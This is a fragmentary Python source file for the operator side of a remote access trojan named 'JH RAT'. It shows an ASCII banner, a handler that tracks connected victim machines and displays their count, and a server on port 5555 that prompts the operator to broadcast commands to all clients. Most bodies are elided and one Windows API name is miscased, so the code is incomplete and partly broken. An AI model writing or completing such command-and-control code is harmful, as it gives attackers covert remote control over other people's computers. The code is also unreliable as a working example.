...
def logo():
    ...
    print(f"| $$  | $$| $$  | $$      | $$  \ $$| $$  | $$   | $$   ")
    print(f"|  $$$$$$/| $$  | $$      | $$  | $$| $$  | $$   | $$   ")
    print(f" \______/ |__/  |__/      |__/  |__/|__/  |__/   |__/   {Fore.RESET}")
                                                    

def handle_client(client_socket, addr):
    clients[addr]= client_socket
    ctypes.windll.kernel32.SetConsoleTitlew(f"JH RAT | CONNECTED CLIENTS:{len(clients)}")
...
def start_server(host="0.0.0.0",port=5555):
    ...
    while True:
        ...
        if choice ==-1:
            command = input("Enter a command to send (broadcast):")
